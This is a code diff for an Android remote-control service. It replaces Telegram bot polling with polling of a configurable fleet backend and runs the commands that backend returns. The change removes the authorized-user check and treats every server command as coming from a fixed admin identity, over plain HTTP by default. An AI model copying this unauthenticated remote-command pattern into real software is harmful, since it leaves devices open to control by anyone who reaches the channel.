@@ -200,21 +200,9 @@ class TelegramRemoteService : Service() {
             LogRepository.addLog(
                 LogType.SYSTEM,
                 "Remote Service Started",
-                "Foreground service is running and polling for Telegram commands"
+                "Foreground service is running and polling Backend Server for dashboard commands"
             )
             startPollingLoop()
-
-            serviceScope.launch {
-                val token = preferenceManager.getBotToken()
-                val authorizedId = preferenceManager.getAuthorizedUserId()
-                if (token.isNotBlank() && authorizedId != 0L) {
-                    telegramClient.sendMessage(
-                        token = token,
-                        chatId = authorizedId,
-                        text = "🟢 <b>Remote Service Online</b>\n\nDevice is connected and ready to receive commands.\nType /help to see all available commands."
-                    )
-                }
-            }
         }
 
         return START_STICKY
@@ -261,12 +249,10 @@ class TelegramRemoteService : Service() {
         }
     }
 
-    private val processedUpdateIds = linkedSetOf<Long>()
-
     suspend fun reconnectPolling(reason: String = "Manual reconnect") {
         LogRepository.addLog(
             LogType.SYSTEM,
-            "Reconnecting Telegram",
+            "Connecting Fleet Server",
             "Re-establishing polling connection ($reason)"
         )
         _connectionStateFlow.value = ServiceConnectionState.CONNECTING
@@ -276,121 +262,63 @@ class TelegramRemoteService : Service() {
     private fun startPollingLoop() {
         pollingJob?.cancel()
         pollingJob = serviceScope.launch {
-            var currentOffset: Long? = null
             var consecutiveErrors = 0
 
             while (isActive) {
                 // Heartbeat timestamp update
                 preferenceManager.updateLastHeartbeat()
 
-                val token = preferenceManager.getBotToken()
-                val authorizedId = preferenceManager.getAuthorizedUserId()
-
-                if (token.isBlank() || authorizedId == 0L) {
-                    _connectionStateFlow.value = ServiceConnectionState.AUTH_ERROR
-                    delay(5000)
-                    continue
+                var serverUrl = preferenceManager.getServerUrl().trim()
+                if (serverUrl.isBlank()) {
+                    serverUrl = "http://localhost:5000"
                 }
 
-                val relayUrl = preferenceManager.getRelayUrl()
-                if (relayUrl.isNotBlank()) {
-                    // Multi-Device Relay Mode (Cloudflare / Google Apps Script)
-                    val status = deviceInfoProvider.getDeviceStatus(_isRunningFlow.value)
-                    val battery = status.batteryPercent
-                    val model = status.model
-                    val deviceId = preferenceManager.getDeviceId()
+                val status = deviceInfoProvider.getDeviceStatus(_isRunningFlow.value)
+                val deviceId = preferenceManager.getDeviceId()
 
-                    val relayResult = telegramClient.pollRelay(relayUrl, deviceId, battery, model)
-                    if (relayResult.isSuccess) {
-                        consecutiveErrors = 0
-                        _connectionStateFlow.value = ServiceConnectionState.CONNECTED
-                        val commands = relayResult.getOrNull().orEmpty()
-                        for (cmd in commands) {
-                            _lastUpdateReceivedFlow.value = System.currentTimeMillis()
-                            val mockMsg = TelegramMessage(
-                                messageId = System.currentTimeMillis(),
-                                from = TelegramUser(id = authorizedId, firstName = "Owner"),
-                                chat = TelegramChat(id = authorizedId),
-                                date = System.currentTimeMillis() / 1000,
-                                text = cmd
-                            )
-                            commandHandler.handleIncomingMessage(
-                                message = mockMsg,
-                                isServiceRunning = true,
-                                serviceStartTimeMs = _startTimeFlow.value
-                            )
-                        }
-                    } else {
-                        consecutiveErrors++
-                        _connectionStateFlow.value = ServiceConnectionState.RECONNECTING
-                    }
-                }
-
-                _connectionStateFlow.value = if (consecutiveErrors > 0) {
-                    ServiceConnectionState.RECONNECTING
-                } else {
-                    ServiceConnectionState.CONNECTED
-                }
-
-                val pollTimeout = if (relayUrl.isNotBlank()) 2 else 25
-                val result = telegramClient.getUpdates(
-                    token = token,
-                    offset = currentOffset,
-                    timeoutSeconds = pollTimeout
+                val backendResult = telegramClient.pollBackendServer(
+                    serverUrl = serverUrl,
+                    deviceId = deviceId,
+                    battery = status.batteryPercent,
+                    model = status.model
                 )
-
-                if (result.isSuccess) {
+                if (backendResult.isSuccess) {
                     consecutiveErrors = 0
                     _connectionStateFlow.value = ServiceConnectionState.CONNECTED
-                    val updates = result.getOrNull().orEmpty()
-
-                    for (update in updates) {
-                        currentOffset = update.updateId + 1
-
-                        // Avoid duplicate processing of the same update
-                        synchronized(processedUpdateIds) {
-                            if (processedUpdateIds.contains(update.updateId)) {
-                                continue
-                            }
-                            processedUpdateIds.add(update.updateId)
-                            if (processedUpdateIds.size > 200) {
-                                processedUpdateIds.remove(processedUpdateIds.first())
-                            }
-                        }
-
+                    val commands = backendResult.getOrNull().orEmpty()
+                    for (cmd in commands) {
                         _lastUpdateReceivedFlow.value = System.currentTimeMillis()
-
-                        val message = update.message
-                        if (message != null) {
-                            commandHandler.handleIncomingMessage(
-                                message = message,
-                                isServiceRunning = true,
-                                serviceStartTimeMs = _startTimeFlow.value
-                            )
-                        }
-
-                        val callback = update.callbackQuery
-                        if (callback != null) {
-                            commandHandler.handleIncomingCallbackQuery(callback)
-                        }
+                        val mockMsg = TelegramMessage(
+                            messageId = System.currentTimeMillis(),
+                            from = TelegramUser(id = 1L, firstName = "AdminPanel"),
+                            chat = TelegramChat(id = 1L),
+                            date = System.currentTimeMillis() / 1000,
+                            text = cmd
+                        )
+                        commandHandler.handleIncomingMessage(
+                            message = mockMsg,
+                            isServiceRunning = true,
+                            serviceStartTimeMs = _startTimeFlow.value
+                        )
                     }
+                    delay(3000L) // Poll backend every 3 seconds
+                    continue
                 } else {
                     consecutiveErrors++
-                    val exception = result.exceptionOrNull()
-                    val errorMsg = exception?.message ?: "Unknown error"
+                    val errorMsg = backendResult.exceptionOrNull()?.message ?: "Server Unreachable"
+                    _connectionStateFlow.value = ServiceConnectionState.RECONNECTING
 
-                    _connectionStateFlow.value = ServiceConnectionState.NETWORK_ERROR
+                    if (consecutiveErrors % 5 == 1) {
+                        LogRepository.addLog(
+                            LogType.ERROR,
+                            "Fleet Polling Error",
+                            "Attempt $consecutiveErrors: $errorMsg ($serverUrl)",
+                            isSuccess = false
+                        )
+                    }
 
-                    LogRepository.addLog(
-                        LogType.ERROR,
-                        "Telegram Polling Error",
-                        "Attempt $consecutiveErrors: $errorMsg",
-                        isSuccess = false
-                    )
-
-                    // Exponential backoff capped at 30 seconds
-                    val backoffSeconds = ((1L shl (consecutiveErrors.coerceAtMost(5))) + (consecutiveErrors * 2L)).coerceIn(3L, 30L)
-                    delay(backoffSeconds * 1000L)
+                    val backoffMs = ((1L shl (consecutiveErrors.coerceAtMost(4))) * 1000L).coerceIn(3000L, 20000L)
+                    delay(backoffMs)
                 }
             }
         }
